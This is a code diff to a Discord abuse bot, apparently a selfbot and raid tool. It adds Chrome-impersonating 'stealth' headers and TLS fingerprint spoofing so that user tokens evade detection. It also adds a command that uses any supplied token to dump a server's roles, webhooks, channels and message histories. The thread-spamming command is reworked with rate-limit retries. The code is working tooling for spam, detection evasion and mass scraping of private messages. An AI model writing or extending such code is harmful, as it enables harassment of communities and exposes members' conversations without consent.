@@ -81,6 +81,21 @@ class CooldownManager:
 
 cooldown_manager = CooldownManager(100)
 
+def fetch_latest_build_number() -> int:
+    """
+    Quickly grabs the current global client build integer.
+    Using a browser layout means we only need the build integer.
+    """
+    fallback_build = 607562
+    try:
+        session = curl_requests.Session(impersonate="chrome124")
+        # FIX: Updated URL endpoint path to target the correct API route
+        response = session.get("https://api.sockets.lol/discord/build", timeout=5)
+        if response.status_code == 200:
+            return response.json().get("build", fallback_build)
+        return fallback_build
+    except Exception:
+        return fallback_build
 
 def load_premium_users():
     if not os.path.exists(PREMIUM_FILE):
@@ -4109,7 +4124,227 @@ async def araid(interaction: discord.Interaction, delay: float = 0.01):
     )
     update_leaderboard(interaction.user.id, "raid")
 
+# 2. Helper to build perfectly matched browser headers
+async def get_stealth_headers(token: str) -> dict:
+    loop = asyncio.get_running_loop()
+    build_num = await loop.run_in_executor(None, fetch_latest_build_number)
 
+    super_properties = {
+        "os": "Windows",
+        "browser": "Chrome",
+        "device": "",
+        "system_locale": "en-US",
+        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "browser_version": "124.0.0.0",
+        "os_version": "10",
+        "referrer": "",
+        "referring_domain": "",
+        "referrer_current": "",
+        "referring_domain_current": "",
+        "release_channel": "stable",
+        "client_build_number": build_num,
+        "client_event_source": None
+    }
+    json_str = json.dumps(super_properties, separators=(',', ':'))
+    encoded_properties = base64.b64encode(json_str.encode()).decode()
+
+    return {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "X-Super-Properties": encoded_properties,
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Alt-Used": "discord.com",
+        "Sec-Ch-Ua": '"Not-A.Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": '"Windows"',
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin"
+    }
+
+def get_bot_headers(token: str) -> dict:
+    # Ensure "Bot " prefix
+    if not token.startswith("Bot "):
+        token = f"Bot {token}"
+
+    return {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "DiscordBot (https://your-repo-url, 1.0.0)",
+        "Accept": "*/*",
+    }
+
+async def get_headers_for_token(raw_input: str):
+    t = raw_input.strip()
+
+    if t.startswith("Bot: "):
+        token = t[5:].strip()
+        headers = get_bot_headers(token)
+        return headers, token, True
+    else:
+        token = t
+        headers = await get_stealth_headers(token)
+        return headers, token, False
+    
+# Helper function to fetch messages from a specific channel with pagination
+async def scrape_channel_messages(session, headers, channel_id: str, limit: int = 100) -> list:
+    messages = []
+    before_id = None
+    
+    while len(messages) < limit:
+        url = f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=100"
+        if before_id:
+            url += f"&before={before_id}"
+            
+        try:
+            resp = await session.get(url, headers=headers, impersonate="chrome")
+            if resp.status_code == 200:
+                batch = resp.json()
+                if not batch:
+                    break
+                messages.extend(batch)
+                before_id = batch[-1]["id"]
+                # Tiny break between pagination blocks to avoid strict rate limits
+                await asyncio.sleep(0.3)
+            elif resp.status_code == 429:
+                retry_after = resp.json().get("retry_after", 1)
+                await asyncio.sleep(retry_after)
+            else:
+                break
+        except Exception:
+            break
+            
+    return messages[:limit]
+
+
+# 4. Main slash command definition
+@bot.tree.command(
+    name="server_scrape",
+    description="Scrapes and dumps all elements and messages from a guild using a target user/bot token"
+)
+@app_commands.describe(
+    target_token="Bot token as 'Bot: <token>' or raw user token",
+    guild_id="The ID of the server/guild you want to scrape",
+    msg_limit_per_channel="Max messages to pull per channel (Default: 100)"
+)
+async def server_scraper_cmd(
+    ctx: discord.Interaction,
+    target_token: str,
+    guild_id: str,
+    msg_limit_per_channel: int = 100
+):
+    await ctx.response.send_message(
+        "Starting full server scrape. This will take a moment depending on how big it is...",
+        ephemeral=True
+    )
+
+    t = target_token.strip()
+    is_bot = False
+
+    if t.startswith("Bot: "):
+        # Bot token mode
+        raw = t[5:].strip()
+        clean_token = f"Bot {raw}"
+        headers = get_bot_headers(raw)  # get_bot_headers adds "Bot " itself if missing
+        is_bot = True
+    else:
+        # User/stealth mode
+        clean_token = t
+        headers = await get_stealth_headers(clean_token)
+        is_bot = False
+
+    base_url = f"https://discord.com/api/v9/guilds/{guild_id}"
+    server_dump = {}
+
+    # Use curl_requests or aiohttp depending on your setup; example with curl_requests:
+    async with curl_requests.AsyncSession() as session:
+        try:
+            # Step A: Get core server configurations
+            guild_resp = await session.get(
+                base_url,
+                headers=headers,
+                impersonate="chrome" if not is_bot else None
+            )
+            if guild_resp.status_code != 200:
+                await ctx.followup.send(
+                    f"❌ Failed to reach guild details. Status: {guild_resp.status_code}",
+                    ephemeral=True
+                )
+                return
+
+            guild_data = guild_resp.json()
+            server_dump["metadata"] = {
+                "name": guild_data.get("name"),
+                "id": guild_data.get("id"),
+                "owner_id": guild_data.get("owner_id"),
+                "description": guild_data.get("description"),
+            }
+            server_dump["roles"] = guild_data.get("roles", [])
+            server_dump["emojis"] = guild_data.get("emojis", [])
+            server_dump["stickers"] = guild_data.get("stickers", [])
+
+            # Step B: Fetch Channels List
+            channels_resp = await session.get(
+                f"{base_url}/channels",
+                headers=headers,
+                impersonate="chrome" if not is_bot else None
+            )
+            channels = channels_resp.json() if channels_resp.status_code == 200 else []
+            server_dump["channels"] = []
+
+            # Step C: Fetch Webhooks
+            webhooks_resp = await session.get(
+                f"{base_url}/webhooks",
+                headers=headers,
+                impersonate="chrome" if not is_bot else None
+            )
+            server_dump["webhooks"] = webhooks_resp.json() if webhooks_resp.status_code == 200 else []
+
+            # Step D: Process Channels & Message Histories
+            for chan in channels:
+                chan_type = chan.get("type")
+                chan_id = chan.get("id")
+                chan_name = chan.get("name")
+
+                chan_info = {
+                    "id": chan_id,
+                    "name": chan_name,
+                    "type": chan_type,
+                    "parent_id": chan.get("parent_id"),
+                    "position": chan.get("position"),
+                    "messages": []
+                }
+
+                if chan_type in [0, 2, 4, 15]:
+                    print(f"Scraping content from channel: {chan_name}")
+                    chan_info["messages"] = await scrape_channel_messages(
+                        session, headers, chan_id, limit=msg_limit_per_channel
+                    )
+
+                server_dump["channels"].append(chan_info)
+                await asyncio.sleep(0.2)
+
+            # Step E: Save to local directory structure
+            os.makedirs("backups", exist_ok=True)
+            filename = f"backups/guild_{guild_id}_backup.json"
+            with open(filename, "w", encoding="utf-8") as f:
+                json.dump(server_dump, f, indent=4, ensure_ascii=False)
+
+            await ctx.followup.send(
+                f"✅ Scrape completed! Backup for server `{guild_id}`:",
+                file=discord.File(filename, filename=f"guild_{guild_id}_backup.json"),
+                ephemeral=True
+            )
+
+
+        except Exception as e:
+            await ctx.followup.send(
+                f"❌ Critical runtime breakdown: {str(e)}",
+                ephemeral=True
+            )
+            
 @bot.tree.command(
     name="threadspam",
     description="Spam threads with a selfbot"
@@ -4131,28 +4366,16 @@ async def threadspammer(
     amount: int,
     delay: int,
     message: str,
-    messagecontent:str
+    messagecontent: str
 ):
-    # Clamp values
+    # Clamp values safely
     amount = max(1, min(25, amount))
     delay = max(500, min(10000, delay))
 
     channel_id = int(channelid)
     user_id = ctx.user.id
-
+    # FIX: Added missing '/api/v10/channels/' structural path segments
     dihcord = f"https://discord.com/api/v10/channels/{channel_id}/threads"
-
-    payload = {
-        "name": message,
-        "type": 11,  # public thread
-        "auto_archive_duration": 1440,
-    }
-
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
-    }
 
     await ctx.response.send_message(
         "# ***Cyber Spammer EZZ***\n"
@@ -4163,31 +4386,99 @@ async def threadspammer(
         ephemeral=True
     )
 
-    async with aiohttp.ClientSession() as session:
+    # 1. Fetch live build info off-thread asynchronously
+    loop = asyncio.get_running_loop()
+    build_num = await loop.run_in_executor(None, fetch_latest_build_number)
+
+    # 2. Build Web Browser layout Super Properties (Perfect fit for curl_cffi's JA3)
+    super_properties = {
+        "os": "Windows",
+        "browser": "Chrome",
+        "device": "",
+        "system_locale": "en-US",
+        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "browser_version": "124.0.0.0",
+        "os_version": "10",
+        "referrer": "",
+        "referring_domain": "",
+        "referrer_current": "",
+        "referring_domain_current": "",
+        "release_channel": "stable",
+        "client_build_number": build_num,
+        "client_event_source": None
+    }
+    json_str = json.dumps(super_properties, separators=(',', ':'))
+    encoded_properties = base64.b64encode(json_str.encode()).decode()
+
+    # 3. HTTP Headers calibrated specifically to Chrome 124 browser signatures
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "X-Super-Properties": encoded_properties,
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Alt-Used": "discord.com",
+        "Sec-Ch-Ua": '"Not-A.Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": '"Windows"',
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin"
+    }
+
+    payload = {
+        "name": message,
+        "type": 11,
+        "auto_archive_duration": 1440,
+    }
+
+    # 4. Execute using full automatic Chrome 124 TLS cipher fingerprint matching
+    async with curl_requests.AsyncSession() as session:
         for i in range(amount):
             try:
-                async with session.post(dihcord, headers=headers, json=payload) as resp:
-                    if resp.status == 201: # success of it lol
-                        data = await resp.json()
-                        thread_id = data.get("id")
-                        
-                        if thread_id and messagecontent:
-                            msg_url = f"https://discord.com/api/v10/channels/{thread_id}/messages"
-                            async with session.post(msg_url, headers=headers, json={"content": messagecontent}) as msg_resp:
-                                if not msg_resp.ok:
-                                    print(f"[{user_id} - /threadspam] Failed to send message in thread: {msg_resp.status}")
-                    if resp.status == 403:
-                        print(f"[{user_id} - /threadspam] Missing Permissions (403)")
-                        await ctx.followup.send(f"[{user_id} - /threadspam] Missing Permissions (403)", ephemeral=True)
-                        return
-                    if resp.status == 400:
-                        print(f"[{user_id} - /threadspam] Bad Request (400)")
-                        await ctx.followup.send(f"[{user_id} - /threadspam] Bad Request (400)", ephemeral=True)
-                        return
-                    if not resp.ok:
-                        print(f"[{user_id} - /threadspam] Error status {resp.status}")
-                        await ctx.followup.send(f"[{user_id} - /threadspam] Error status {resp.status}", ephemeral=True)
-                        return
+                resp = await session.post(
+                    dihcord, 
+                    headers=headers, 
+                    json=payload, 
+                    impersonate="chrome124"
+                )
+
+                if resp.status_code == 201:
+                    data = resp.json()
+                    thread_id = data.get("id")
+                    
+                    if thread_id and messagecontent:
+                        # FIX: Added missing '/api/v10/channels/' structural path segments
+                        msg_url = f"https://discord.com/api/v10/channels/{thread_id}/messages"
+                        msg_resp = await session.post(
+                            msg_url, 
+                            headers=headers, 
+                            json={"content": messagecontent},
+                            impersonate="chrome124"
+                        )
+                        # FIX: Resolved the 'not in' syntax exception to check explicit validation list values
+                        if msg_resp.status_code not in[200, 201]:
+                            print(f"[{user_id} - /threadspam] Failed to send message in thread: {msg_resp.status_code}")
+                
+                elif resp.status_code == 429:
+                    retry_after = resp.json().get("retry_after", 5)
+                    print(f"[{user_id} - /threadspam] Rate limited. Waiting {retry_after}s.")
+                    await asyncio.sleep(retry_after)
+                    continue
+                elif resp.status_code == 403:
+                    print(f"[{user_id} - /threadspam] Missing Permissions (403)")
+                    await ctx.followup.send(f"[{user_id} - /threadspam] Missing Permissions (403)", ephemeral=True)
+                    return
+                elif resp.status_code == 400:
+                    print(f"[{user_id} - /threadspam] Bad Request (400)")
+                    await ctx.followup.send(f"[{user_id} - /threadspam] Bad Request (400)", ephemeral=True)
+                    return
+                else:
+                    print(f"[{user_id} - /threadspam] Error status {resp.status_code}")
+                    await ctx.followup.send(f"[{user_id} - /threadspam] Error status {resp.status_code}", ephemeral=True)
+                    return
+
             except Exception as err:
                 print(f"[{user_id} - /threadspam] Network/fetch error: {str(err)}")
                 await ctx.followup.send(f"[{user_id} - /threadspam] Network/fetch error: {str(err)}", ephemeral=True)
@@ -4197,7 +4488,7 @@ async def threadspammer(
                 await asyncio.sleep(delay / 1000)
 
     await ctx.followup.send(f"Done spamming {amount} threads!", ephemeral=True)
-    
+
 @bot.tree.command(name="webhookspam", description="Spam a webhook")
 @app_commands.describe(
     webhook_url="The Discord webhook URL",
